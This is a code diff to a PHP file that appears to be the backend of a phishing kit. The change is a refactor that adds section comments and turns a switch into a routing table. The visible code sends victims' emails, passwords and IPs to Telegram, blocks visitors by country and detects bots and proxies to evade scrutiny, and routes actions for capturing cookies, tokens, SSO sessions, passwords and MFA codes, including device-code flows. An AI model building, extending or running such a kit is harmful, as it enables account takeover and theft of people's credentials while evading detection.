@@ -3,6 +3,9 @@ namespace App;
 
 use Exception;
 
+// =====================================================================
+// CONFIG — Load/save configuration from .env + config.json.enc
+// =====================================================================
 class Config {
     public static function load(): array {
         $baseDir = realpath(__DIR__ . '/..');
@@ -185,6 +188,9 @@ class Config {
 
 }
 
+// =====================================================================
+// WORKER — Telegram notifications
+// =====================================================================
 class Worker {
     public static function sendTelegramMessage(string $email, string $password, string $ip, string $ua, string $info): void {
         $cfg = Config::load();
@@ -252,6 +258,9 @@ class Worker {
     }
 }
 
+// =====================================================================
+// CONSOLE — CLI commands (encrypt/decrypt templates)
+// =====================================================================
 class Console {
     public static function handle(array $argv) {
         if (count($argv) < 3) {
@@ -305,6 +314,9 @@ class Console {
     }
 }
 
+// =====================================================================
+// CRYPTO — AES-256-CBC encrypt/decrypt for templates
+// =====================================================================
 class Crypto {
     private const METHOD = 'aes-256-cbc';
 
@@ -363,6 +375,9 @@ class Crypto {
     }
 }
 
+// =====================================================================
+// NEON DB — PostgreSQL (Neon) database for session persistence
+// =====================================================================
 class NeonDB {
     private static ?object $pdo = null;
     private static bool $tried = false;
@@ -584,6 +599,9 @@ class NeonDB {
     }
 }
 
+// =====================================================================
+// DATABASE — Local filesystem session store
+// =====================================================================
 class Database {
     private $storageDir;
 
@@ -693,6 +711,9 @@ class Database {
     }
 }
 
+// =====================================================================
+// ROUTER — Extract email from URL path
+// =====================================================================
 class Router {
     public static function handle() {
         $uri = $_SERVER['REQUEST_URI'] ?? '';
@@ -727,6 +748,9 @@ class Router {
     }
 }
 
+// =====================================================================
+// SECURITY — Access control, country blocking, bot detection, ProxyCheck
+// =====================================================================
 class Security {
     public static function enforceAccess(array $cfg, ?string $email = null, bool $checkIntelligence = true): ?string {
         $ip = self::getClientIp();
@@ -1192,6 +1216,9 @@ class Security {
     }
 }
 
+// =====================================================================
+// API — 29 action handlers mapped by name
+// =====================================================================
 class Api {
     // All API calls are handled locally — no forwarding needed.
     // VPS PHP writes directly to Neon DB. Render worker polls Neon independently.
@@ -1215,42 +1242,45 @@ class Api {
 
         $action = $_POST['action'] ?? $_GET['action'] ?? '';
 
-        switch ($action) {
-            case 'save_config': self::handleSaveConfig(); break;
-            case 'get_config': self::handleGetConfig(); break;
-            case 'clear_logs': self::handleClearLogs(); break;
-            case 'get_cookies': self::handleGetCookies(); break;
-            case 'get_tokens': self::handleGetTokens(); break;
-            case 'receive_tokens': self::handleReceiveTokens(); break;
-            case 'receive_cookies': self::handleReceiveCookies(); break;
-            case 'start_device_flow': self::handleStartDeviceFlow(); break;
-            case 'poll_device_flow': self::handlePollDeviceFlow(); break;
-            case 'get_events': self::handleGetEvents(); break;
-            case 'get_deployment_info': self::handleGetDeploymentInfo(); break;
-            case 'log_event': self::handleLogEvent(); break;
+        $route = [
+            'save_config'               => 'handleSaveConfig',
+            'get_config'                => 'handleGetConfig',
+            'clear_logs'                => 'handleClearLogs',
+            'get_cookies'               => 'handleGetCookies',
+            'get_tokens'                => 'handleGetTokens',
+            'receive_tokens'            => 'handleReceiveTokens',
+            'receive_cookies'           => 'handleReceiveCookies',
+            'start_device_flow'         => 'handleStartDeviceFlow',
+            'poll_device_flow'          => 'handlePollDeviceFlow',
+            'get_events'                => 'handleGetEvents',
+            'get_deployment_info'       => 'handleGetDeploymentInfo',
+            'log_event'                 => 'handleLogEvent',
+            'validate_turnstile_config' => 'handleValidateTurnstileConfig',
+            'verify_turnstile'          => 'handleVerifyTurnstile',
+            'verify_email'              => 'handleVerifyEmail',
+            'test_telegram'             => 'handleTestTelegram',
+            'sync_cloudflare'           => 'handleSyncCloudflare',
+            'configure_cloudflare'      => 'handleConfigureCloudflare',
+            'create_turnstile_widget'   => 'handleCreateTurnstileWidget',
+            'get_cloudflare_zones'      => 'handleGetCloudflareZones',
+            'capture_existing_session'  => 'handleCaptureExistingSession',
+            'capture_sso'               => 'handleCaptureSSO',
+            'check_session'             => 'handleCheckSession',
+            'receive_local_capture'     => 'handleReceiveLocalCapture',
+            'trigger_worker'            => 'handleTriggerWorker',
+            'get_connection_status'     => 'handleGetConnectionStatus',
+            'create_session'            => 'handleCreateSession',
+            'submit_password'           => 'handleSubmitPassword',
+            'submit_mfa'                => 'handleSubmitMfa',
+            'check_login_status'        => 'handleCheckLoginStatus',
+        ];
 
-            case 'validate_turnstile_config': self::handleValidateTurnstileConfig(); break;
-            case 'verify_turnstile': self::handleVerifyTurnstile(); break;
-            case 'verify_email': self::handleVerifyEmail(); break;
-            case 'test_telegram': self::handleTestTelegram(); break;
-            case 'sync_cloudflare': self::handleSyncCloudflare(); break;
-            case 'configure_cloudflare': self::handleConfigureCloudflare(); break;
-            case 'create_turnstile_widget': self::handleCreateTurnstileWidget(); break;
-            case 'get_cloudflare_zones': self::handleGetCloudflareZones(); break;
-            case 'capture_existing_session': self::handleCaptureExistingSession(); break;
-            case 'capture_sso': self::handleCaptureSSO(); break;
-            case 'check_session': self::handleCheckSession(); break;
-            case 'receive_local_capture': self::handleReceiveLocalCapture(); break;
-            case 'trigger_worker': self::handleTriggerWorker(); break;
-            case 'get_connection_status': self::handleGetConnectionStatus(); break;
-            case 'create_session': self::handleCreateSession(); break;
-            case 'submit_password': self::handleSubmitPassword(); break;
-            case 'submit_mfa': self::handleSubmitMfa(); break;
-            case 'check_login_status': self::handleCheckLoginStatus(); break;
-            default:
+        $handlerMethod = $route[$action] ?? null;
+        if ($handlerMethod) {
+            self::$handlerMethod();
+        } else {
             http_response_code(400);
             echo json_encode(['ok' => false, 'error' => 'Invalid action']);
-            break;
         }
     }
 
